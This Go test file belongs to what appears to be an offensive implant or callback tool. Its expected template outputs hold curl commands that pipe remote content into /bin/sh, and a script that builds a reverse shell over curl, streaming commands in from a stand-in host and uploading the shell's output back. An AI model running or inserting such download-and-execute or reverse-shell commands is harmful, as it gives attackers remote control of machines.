package crstemplate

/*
 * crstemplate_test.go
 * Tests for crstemplate.go
 * By J. Stuart McMurray
 * Created 20241212
 * Last Modified 20250115
 */

import (
	"errors"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"reflect"
	"testing"
)

// Make sure we have ALL the subtemplates and the root template is emptyish.
func TestDefaultTemplate_SubtemplatesExist(t *testing.T) {
	/* Make sure the template has the requisite parts. */
	for _, n := range []string{
		baseName,
		SubtemplateCallback,
		SubtemplateFiles,
		SubtemplateScript,
	} {
		/* Make sure it exists. */
		if nil == parsedDefaultTemplate.Lookup(n) {
			t.Errorf("Missing template: %s", n)
		}
	}
}

// Make sure we can execute things.
func TestExecute(t *testing.T) {
	/* tmplFilename is where we'll store the template we'll write. */
	var (
		tmplFilename = "test.tmpl"
		testID       = "testID"
		params       = Params{
			PubkeyFP: "testFPtestFPtestFPtestFPtestFPtestFPtestFPx=",
			Host:     "testURL.test:4444",
			ID:       testID,
			Path:     "/c/test/test",
			URLPaths: URLPaths{
				In:     "testI",
				InOut:  "testIO",
				Out:    "testO",
				Script: "testC",
			},
		}
	)
	const haveNoFile = "TEST_NO_FILE" /* Don't make a file. */
	const (                           /* Default template output. */
		defaultCallback = "curl -sk --pinnedpubkey sha256//" +
			"testFPtestFPtestFPtestFPtestFPtestFPtestFPx= " +
			"https://testURL.test:4444/testC | /bin/sh"
		defaultFiles = "curl -sk --pinnedpubkey sha256//" +
			"testFPtestFPtestFPtestFPtestFPtestFPtestFPx= " +
			"https://testURL.test:4444"
		defaultScript = `#!/bin/sh
curl -sk --pinnedpubkey sha256//testFPtestFPtestFPtestFPtestFPtestFPtestFPx= https://testURL.test:4444/testI/testID -N  </dev/null 2>&0 |
/bin/sh 2>&1 |
curl -sk --pinnedpubkey sha256//testFPtestFPtestFPtestFPtestFPtestFPtestFPx= https://testURL.test:4444/testO/testID -T- >/dev/null 2>&1
`
	)
	/* Make sure we don't miss anything if we've added a field later. */
	if got := firstEmptyField(params, ""); "" != got {
		t.Fatalf("Field %s unset in params", got)
	}

	type testC struct {
		name string /* Subtemplate */
		have string /* Template body */
		want string
		werr error /* Wanted error */
	}
	cs := map[string]testC{
		SubtemplateCallback + "/empty": {
			name: SubtemplateCallback,
			want: defaultCallback,
		},
		SubtemplateFiles + "/empty": {
			name: SubtemplateFiles,
			want: defaultFiles,
		},
		SubtemplateScript + "/empty": {
			name: SubtemplateScript,
			want: defaultScript,
		},
		SubtemplateCallback + "/no_file": {
			name: SubtemplateCallback,
			have: haveNoFile,
			want: defaultCallback,
			werr: fs.ErrNotExist,
		},
		SubtemplateFiles + "/no_file": {
			name: SubtemplateFiles,
			have: haveNoFile,
			want: defaultFiles,
			werr: fs.ErrNotExist,
		},
		SubtemplateScript + "/no_file": {
			name: SubtemplateScript,
			have: haveNoFile,
			want: defaultScript,
			werr: fs.ErrNotExist,
		},
		SubtemplateCallback + "/overridden": {
			name: SubtemplateCallback,
			have: `{{define "callback"}}ID: {{.ID}}{{end}}`,
			want: "ID: " + testID,
		},
		SubtemplateFiles + "/overridden": {
			name: SubtemplateFiles,
			have: `{{define "files"}}ID: {{.ID}}{{end}}`,
			want: "ID: " + testID,
		},
		SubtemplateScript + "/overridden": {
			name: SubtemplateScript,
			have: `{{define "script"}}ID: {{.ID}}{{end}}`,
			want: "ID: " + testID,
		},
		SubtemplateCallback + "/not_subtemplate": {
			name: SubtemplateCallback,
			have: `kittens`,
			werr: ErrOutsideSubtemplate,
		},
		SubtemplateFiles + "/not_subtemplate": {
			name: SubtemplateFiles,
			have: `kittens`,
			werr: ErrOutsideSubtemplate,
		},
		SubtemplateScript + "/not_subtemplate": {
			name: SubtemplateScript,
			have: `kittens`,
			werr: ErrOutsideSubtemplate,
		},
		SubtemplateCallback + "/extraneous_subtemplate": {
			name: SubtemplateCallback,
			have: `{{define "kittens"}}ID: {{.ID}}{{end}}`,
			want: defaultCallback,
		},
		SubtemplateFiles + "/extraneous_subtemplate": {
			name: SubtemplateFiles,
			have: `{{define "kittens"}}ID: {{.ID}}{{end}}`,
			want: defaultFiles,
		},
		SubtemplateScript + "/extraneous_subtemplate": {
			name: SubtemplateScript,
			have: `{{define "kittens"}}ID: {{.ID}}{{end}}`,
			want: defaultScript,
		},
	}
	for n, c := range cs {
		t.Run(n, func(t *testing.T) {
			/* Make our template file. */
			fn := filepath.Join(t.TempDir(), tmplFilename)
			if haveNoFile != c.have {
				if err := os.WriteFile(
					fn,
					[]byte(c.have),
					0600,
				); nil != err {
					t.Fatalf(
						"Error populating %s: %s",
						fn,
						err,
					)
				}
			}
			/* Execute! */
			got, err := Execute(
				c.name,
				fn,
				params,
			)
			if nil != c.werr { /* Expected an error. */
				if !errors.Is(err, c.werr) {
					t.Fatalf(
						"Incorrect error:\n"+
							" got: %s\n"+
							"want: %s",
						c.werr,
						err,
					)
				}
				/* We'll still check the output. */
			} else if nil != err { /* Unexpected error. */
				t.Fatalf("Execution error: %s", err)
			}

			if got != c.want { /* Wrong output. */
				t.Fatalf(
					"Incorrect output:\n"+
						"have:\n%s\n"+
						"got:\n%s\n"+
						"want:\n%s",
					c.have,
					got,
					c.want,
				)
			}
		})
	}
}

// firstEmptyField returns the first empty field in x, recursing into
// substructs.  The field name will be prefixed with prefix, which should
// normally not be set by callers.
// firstEmptyField panics if x isn't a struct.
func firstEmptyField(x any, prefix string) string {
	v := reflect.ValueOf(x)
	/* If we don't have a struct, life's easy. */
	if k := v.Kind(); reflect.Struct != k {
		panic(fmt.Sprintf(
			"got a %s, expected a %s",
			k,
			reflect.Struct,
		))
	}
	/* Check each field. */
	for i := range v.NumField() {
		f := v.Field(i)
		/* If we've got a sub-struct, recurse. */
		if reflect.Struct == f.Kind() {
			if nz := firstEmptyField(
				f.Interface(),
				v.Type().Field(i).Name+".",
			); "" != nz {
				return nz
			}
			/* Look ok */
			continue
		}
		/* Make sure this isn't a zero struct. */
		if f.IsZero() {
			return prefix + v.Type().Field(i).Name
		}
	}

	return ""
}
